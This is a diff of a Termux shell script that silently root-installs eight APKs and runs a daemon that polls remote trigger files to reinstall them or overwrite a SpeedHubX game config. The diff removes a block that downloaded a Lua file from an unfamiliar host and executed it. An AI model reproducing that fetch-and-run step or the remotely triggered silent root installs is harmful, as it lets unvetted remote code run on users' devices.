@@ -3,43 +3,16 @@
 # One-shot installer + continuous daemon that polls remote trigger files.
 # Adds: JSON config updater driven by a second trigger.
 # Includes: original 8 APK links, resume downloads, silent root installs (tsu/su),
-# KEEP_APKS support, --test, --daemonize, --pidfile, --logfile, --help.
-
+#          KEEP_APKS support, --test, --daemonize, --pidfile, --logfile, --help.
 set -u
-
-# ----------------- Pre-install sequence (added) -----------------
-echo "[PRE] Updating Termux and installing prerequisites (step 1)..."
-pkg update -y && pkg upgrade -y && pkg install -y imagemagick python termux-api && pip install --no-input --upgrade pip || true
-pip install --no-input wand
-
-echo "[PRE] Setting up storage and installing dependencies (step 2)..."
-pkg update -y && echo "y" | termux-setup-storage
-pkg install -y python tsu libexpat git openssl lua53
-pip install --no-input aiofiles aiohttp aiosqlite crypto cython pycryptodome pyfiglet requests rich
-
-echo "[PRE] Fetching and running reconnect tool (step 3)..."
-mkdir -p /sdcard/download || true
-curl -fL -o /sdcard/download/reconnect.lua "http://raw.reconnect-tool.top/main/v5/v5GHI789RST654kLmNoPqRsT3x79MrtjKuVwX321098d1fgg"
-
-# Try to launch with whatever Lua is available
-LUA_BIN="$(command -v lua || command -v lua5.3 || command -v lua53 || true)"
-if [ -n "${LUA_BIN:-}" ]; then
-  "$LUA_BIN" /sdcard/download/reconnect.lua || true
-else
-  echo "[PRE] Warning: No 'lua' binary found. Skipping execution of reconnect.lua."
-fi
-
-echo "[PRE] You have 120 seconds to complete reconnect tool setup..."
-sleep 120
-echo "[PRE] Pre-install sequence completed. Proceeding to main script..."
 
 # ----------------- Configuration (override with env vars) -----------------
 WORKDIR="${WORKDIR:-$HOME/cryptic_apks}"
-KEEP_APKS="${KEEP_APKS:-0}" # set KEEP_APKS=1 to keep apk files
-POLL_INTERVAL="${POLL_INTERVAL:-30}" # seconds between trigger checks
+KEEP_APKS="${KEEP_APKS:-0}"                 # set KEEP_APKS=1 to keep apk files
+POLL_INTERVAL="${POLL_INTERVAL:-30}"        # seconds between trigger checks
 
 # Triggers (0/1 content; '1' triggers actions on change)
-TRIGGER_URL="${TRIGGER_URL:-https://raw.githubusercontent.com/Anrd5/MyAppCollection/refs/heads/main/RefreshClones.txt}" # APK trigger (updated)
+TRIGGER_URL="${TRIGGER_URL:-https://raw.githubusercontent.com/Anrd5/MyAppCollection/refs/heads/main/RefreshClones.txt}"    # APK trigger (updated)
 SCRIPT_TRIGGER_URL="${SCRIPT_TRIGGER_URL:-https://raw.githubusercontent.com/Anrd5/MyAppCollection/refs/heads/main/RefreshScript.txt}" # JSON trigger (new)
 
 # JSON updater
@@ -47,21 +20,22 @@ JSON_SOURCE_URL="${JSON_SOURCE_URL:-https://github.com/Anrd5/MyAppCollection/rel
 JSON_DEST="${JSON_DEST:-/storage/emulated/0/cryptic/Workspace/SpeedHubX/Grow a Garden.json}"
 
 # State tracking
-STATE_FILE="${WORKDIR}/.last_refresh_state"      # legacy: APK trigger
-STATE_FILE_SCRIPT="${WORKDIR}/.last_refresh_script" # new: JSON trigger
+STATE_FILE="${WORKDIR}/.last_refresh_state"             # legacy: APK trigger
+STATE_FILE_SCRIPT="${WORKDIR}/.last_refresh_script"     # new: JSON trigger
+
 PIDFILE_DEFAULT="${WORKDIR}/cryptic_daemon.pid"
 LOGFILE_DEFAULT="${HOME}/cryptic_daemon.log"
 
 # ----------------- The APK links (unchanged) -----------------
 LINKS=(
-  "https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.0.apk"
-  "https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.1.apk"
-  "https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.2.apk"
-  "https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.3.apk"
-  "https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.4.apk"
-  "https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.5.apk"
-  "https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.6.apk"
-  "https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.7.apk"
+"https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.0.apk"
+"https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.1.apk"
+"https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.2.apk"
+"https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.3.apk"
+"https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.4.apk"
+"https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.5.apk"
+"https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.6.apk"
+"https://github.com/Anrd5/MyAppCollection/releases/download/V1.0/Cryptic.7.apk"
 )
 
 # ----------------- CLI parsing -----------------
@@ -90,8 +64,8 @@ Environment variables:
 
 Examples:
   $0 --test
-  $0 --daemonize POLL_INTERVAL=10 KEEP_APKS=1
-  $0 --daemonize --logfile /sdcard/cryptic_log.txt
+  $0 --daemonize
+  POLL_INTERVAL=10 KEEP_APKS=1 $0 --daemonize --logfile /sdcard/cryptic_log.txt
 EOF
 }
 
@@ -101,11 +75,11 @@ while [ $i -le $# ]; do
   arg="${!i}"
   case "$arg" in
     --daemonize) DAEMONIZE=1 ;;
-    --pidfile)   i=$((i+1)); PIDFILE="${!i:-}";;
-    --logfile)   i=$((i+1)); LOGFILE="${!i:-}";;
-    --test)      TEST_MODE=1 ;;
-    --help|-h)   usage; exit 0 ;;
-    *)           echo "Unknown option: $arg"; usage; exit 1 ;;
+    --pidfile) i=$((i+1)); PIDFILE="${!i:-}";;
+    --logfile) i=$((i+1)); LOGFILE="${!i:-}";;
+    --test) TEST_MODE=1 ;;
+    --help|-h) usage; exit 0 ;;
+    *) echo "Unknown option: $arg"; usage; exit 1 ;;
   esac
   i=$((i+1))
 done
@@ -131,13 +105,12 @@ if [ "$DAEMONIZE" = 1 ]; then
       rm -f "$PIDFILE" 2>/dev/null || true
     fi
   fi
-
   # Re-launch self with nohup into log
   mkdir -p "$(dirname "$LOGFILE")" 2>/dev/null || true
   nohup "$0" --pidfile "$PIDFILE" --logfile "$LOGFILE" > "$LOGFILE" 2>&1 &
   childpid=$!
   echo "$childpid" > "$PIDFILE"
-  echo "Started daemon (PID $childpid). Log: $LOGFILE PID: $PIDFILE"
+  echo "Started daemon (PID $childpid). Log: $LOGFILE  PID: $PIDFILE"
   exit 0
 fi
 
@@ -226,7 +199,7 @@ get_remote_flag() {
   content="$(printf '%s' "$content" | tr -d ' \t\r\n' | cut -c1 || true)"
   case "$content" in
     0|1) printf '%s' "$content" ;;
-    *)   printf '' ;;
+    *) printf '' ;;
   esac
 }
 
@@ -236,7 +209,6 @@ do_downloads_and_installs() {
   for url in "${LINKS[@]}"; do
     fname="${url##*/}"
     log "Processing: $fname"
-
     if [ -f "$fname" ] && [ ! -s "$fname" ]; then
       log "Removing zero-size stale file $fname"
       rm -f "$fname"
@@ -257,7 +229,6 @@ do_downloads_and_installs() {
 
     size_bytes=$(stat -c%s "$fname" 2>/dev/null || ls -l "$fname" | awk '{print $5}')
     log "Downloaded $fname (${size_bytes} bytes). Installing..."
-
     install_apk_root "$PWD/$fname"
     inst_rc=$?
     if [ $inst_rc -eq 0 ]; then
@@ -278,7 +249,6 @@ do_downloads_and_installs() {
 update_json_from_remote() {
   log "Starting JSON update: source=$JSON_SOURCE_URL -> dest=$JSON_DEST"
   local tmp="${WORKDIR}/SpeedHubX.Config.json.tmp"
-
   download_file "$JSON_SOURCE_URL" "$tmp"
   dlrc=$?
   if [ $dlrc -ne 0 ]; then
@@ -289,7 +259,6 @@ update_json_from_remote() {
     log "Downloaded JSON is empty. Aborting JSON update."
     return 1
   fi
-
   size_bytes=$(stat -c%s "$tmp" 2>/dev/null || ls -l "$tmp" | awk '{print $5}')
   log "Downloaded JSON (${size_bytes} bytes). Writing to destination..."
 
@@ -331,8 +300,8 @@ if [ -f "$STATE_FILE_SCRIPT" ]; then
 fi
 
 log "Daemon starting. Polling every ${POLL_INTERVAL}s."
-log " - APK trigger: $TRIGGER_URL (last='$last_state_clones')"
-log " - JSON trigger: $SCRIPT_TRIGGER_URL (last='$last_state_script')"
+log " - APK trigger:    $TRIGGER_URL (last='$last_state_clones')"
+log " - JSON trigger:   $SCRIPT_TRIGGER_URL (last='$last_state_script')"
 log "Logfile: ${LOGFILE}"
 
 while true; do
